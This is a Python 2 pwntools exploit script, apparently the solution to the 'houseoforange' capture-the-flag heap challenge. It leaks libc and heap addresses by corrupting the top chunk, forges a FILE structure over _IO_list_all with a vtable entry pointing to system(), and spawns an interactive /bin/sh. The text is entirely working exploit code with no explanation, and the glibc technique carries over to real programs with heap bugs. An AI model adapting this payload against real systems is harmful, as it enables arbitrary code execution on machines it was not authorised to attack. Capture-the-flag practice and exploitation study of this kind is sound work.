from pwn import *
p = process("./houseoforange")
libc = ELF("/libc64.so.6")
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']


def build(a, b):
    p.sendlineafter(":", '1')
    p.sendlineafter(":", str(a))
    p.sendafter(":", b)
    p.sendlineafter(":", '1')
    p.sendlineafter(":", '1')


def upgrade(a, b):
    p.sendlineafter(": ", '3')
    p.sendlineafter(":", str(a))
    p.sendafter(":", b)
    p.sendlineafter(":", '1')
    p.sendlineafter(":", '1')


def see():
    p.sendlineafter(": ", '2')


# context.log_level = 'debug'
build(0x28, 'abc')
pay = p64(0) * 5 + p64(0x21) + p64(0x0000001f00000001)
pay += p64(0) * 2 + p64(0xf91)
upgrade(0x60, pay)
build(0x1000, 'abc')
build(0x400, '1' * 8)
see()
p.recvuntil("1" * 8)
libc_base = u64(p.recv(6) + '\x00\x00') - 1640 - 0X3C4B20
print hex(libc_base)
system = libc_base + libc.symbols['system']
upgrade(0x100, 'a' * 16)
see()
p.recvuntil('a' * 16)
heap_base = u64(p.recv(6) + '\x00\x00') - 0xd0
print hex(heap_base)
payload = p64(0) * 0x81 + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)
fakechunk = '/bin/sh\x00' + p64(0x60)
fakechunk += p64(0xddaa) + p64(libc_base + libc.symbols['_IO_list_all'] - 0x10)
print hex(libc_base + libc.symbols['_IO_list_all'])
fakechunk += p64(0) + p64(1)
fakechunk = fakechunk.ljust(0xc0, '\x00')
payload += fakechunk
payload += p64(0) * 3
payload += p64(heap_base + 0x5e8)  #vtable
payload += p64(0) * 4
payload += p64(system)
upgrade(len(payload), payload)
gdb.attach(p, 'b *' + hex(system))
# gdb.attach(p)
p.recv()
p.sendline('1')
p.interactive()
